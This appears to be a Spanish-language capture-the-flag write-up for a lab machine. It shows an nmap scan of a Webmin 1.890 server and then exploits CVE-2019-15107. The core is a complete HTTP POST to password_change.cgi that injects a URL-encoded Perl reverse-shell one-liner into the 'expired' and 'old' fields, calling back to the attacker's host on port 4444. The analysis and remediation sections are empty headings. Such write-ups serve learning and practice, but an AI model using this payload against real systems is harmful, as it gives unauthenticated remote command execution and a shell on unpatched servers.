# Source

## Initial Scan
```
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
```
## Exploit 
En la room en si nos dicen que es una vulnerabilidad reciente y que no necesitamos autentificacón para explotarla, eso nos deja un único candidato
### CVE 2019-15107

Los exploit que he encontrado sin metasploit todos inyectan solo en el parametro old, pero por algún motivo que ahora mismo desconozco para que el exploit funcione de manera correcta hay que inyectar tambien el expired, para ello crafteamos la siguiente request en burpsuite y con ello obtenemos una reverse shell en nuestra máquina
```
POST /password_change.cgi HTTP/1.1
Host: 10.10.156.161:10000
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Referer: https://IP:10000/session_login.cgi
Content-Type: application/x-www-form-urlencoded
Content-Length: 499
Connection: close
cache-control: no-cache

expired=perl%20-MIO%20-e%20%27%24p%3Dfork%3Bexit%2Cif%28%24p%29%3B%24c%3Dnew%20IO%3A%3ASocket%3A%3AINET%28PeerAddr%2C%22(LHOST)3A4444%22%29%3BSTDIN-%3Efdopen%28%24c%2Cr%29%3B%24~-%3Efdopen%28%24c%2Cw%29%3Bsystem%24_%20while%3C%3E%3B%27&new1=haxxedid
&new2=haxxed&old=perl%20-MIO%20-e%20%27%24p%3Dfork%3Bexit%2Cif%28%24p%29%3B%24c%3Dnew%20IO%3A%3ASocket%3A%3AINET%28PeerAddr%2C%22(LHOST)%3A4444%22%29%3BSTDIN-%3Efdopen%28%24c%2Cr%29%3B%24~-%3Efdopen%28%24c%2Cw%29%3Bsystem%24_%20while%3C%3E%3B%27
```

# Analisís de la intrusión
## CVE

# Soluciones 
## CVE
